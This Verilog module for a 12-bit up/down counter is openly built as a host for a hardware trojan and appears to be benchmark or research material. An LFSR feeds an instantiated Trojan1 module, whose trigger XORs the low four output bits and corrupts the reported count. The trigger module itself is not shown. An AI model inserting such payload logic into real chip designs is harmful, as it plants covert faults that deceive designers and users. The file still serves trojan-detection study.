// Counter Host Circuit for Trojan1 (revised)
// Logic: free-running counter over full range 0 .. 2^COUNTER_WIDTH-1 with symmetric wrap.
// LFSR uses all 24 bits for trojan_r1 selection.
module trojan1_counter_host #(
    parameter integer COUNTER_WIDTH = 12,    // Counter width in bits
    parameter [23:0]  R1_INIT        = 24'hDEADBE // LFSR seed
)(
    input  wire clk,
    input  wire rst,
    input  wire count_enable,
    input  wire count_direction, // 0=up, 1=down
    input  wire [COUNTER_WIDTH-1:0] load_value,
    input  wire load_enable,
    output reg  [COUNTER_WIDTH-1:0] count_value,
    output reg  overflow_flag,
    output reg  underflow_flag
);

    // Full-range counter: 0 .. 2^COUNTER_WIDTH - 1 (COUNT_LIMIT parameter removed)
    localparam [COUNTER_WIDTH-1:0] MAX_VALUE = {COUNTER_WIDTH{1'b1}}; // highest representable value

    // ---------------- Trojan interface ----------------
    wire trojan_r1;
    wire trojan_trigger;

    // ---------------- Internal state ----------------
    reg [COUNTER_WIDTH-1:0] counter;
    reg [23:0] r1_lfsr;
    reg [4:0]  r1_bit_select; // 0..23 covers all bits

    // ---------------- LFSR for r1 generation ----------------
    // Keep original taps (23,17,14,1). Update only when actively counting.
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            r1_lfsr       <= R1_INIT;
            r1_bit_select <= 5'd0;
        end else if (count_enable) begin
            r1_lfsr <= {r1_lfsr[22:0], r1_lfsr[23] ^ r1_lfsr[17] ^ r1_lfsr[14] ^ r1_lfsr[1]};
            r1_bit_select <= (r1_bit_select == 5'd23) ? 5'd0 : r1_bit_select + 5'd1;
        end
    end

    assign trojan_r1 = r1_lfsr[r1_bit_select];

    // ---------------- Counter core ----------------
    wire at_min = (counter == {COUNTER_WIDTH{1'b0}});
    wire at_max = (counter == MAX_VALUE);

    always @(posedge clk or posedge rst) begin
        if (rst) begin
            counter        <= {COUNTER_WIDTH{1'b0}};
            overflow_flag  <= 1'b0;
            underflow_flag <= 1'b0;
        end else if (load_enable) begin
            // Load direct (value already width-limited)
            counter        <= load_value;
            overflow_flag  <= 1'b0;
            underflow_flag <= 1'b0;
        end else if (count_enable) begin
            if (!count_direction) begin
                // Up counting
                if (at_max) begin
                    counter       <= {COUNTER_WIDTH{1'b0}};
                    overflow_flag <= 1'b1;  // one-shot pulse this cycle
                end else begin
                    counter       <= counter + 1'b1;
                    overflow_flag <= 1'b0;
                end
                underflow_flag <= 1'b0;
            end else begin
                // Down counting
                if (at_min) begin
                    counter         <= MAX_VALUE;
                    underflow_flag  <= 1'b1; // one-shot pulse this cycle
                end else begin
                    counter         <= counter - 1'b1;
                    underflow_flag  <= 1'b0;
                end
                overflow_flag <= 1'b0;
            end
        end else begin
            // Idle: clear one-shot flags
            overflow_flag  <= 1'b0;
            underflow_flag <= 1'b0;
        end
    end

    // ---------------- Output (trojan perturbation) ----------------
    wire [COUNTER_WIDTH-1:0] trojan_mask = (COUNTER_WIDTH >= 4) ? {{(COUNTER_WIDTH-4){1'b0}}, 4'hF} : {COUNTER_WIDTH{1'b1}};

    always @(posedge clk or posedge rst) begin
        if (rst)
            count_value <= {COUNTER_WIDTH{1'b0}};
        else
            count_value <= counter ^ (trojan_trigger ? trojan_mask : {COUNTER_WIDTH{1'b0}});
    end

    // ---------------- Trojan instance ----------------
    Trojan1 trojan_inst (
        .clk(clk),
        .rst(rst),
        .r1(trojan_r1),
        .trigger(trojan_trigger)
    );

endmodule

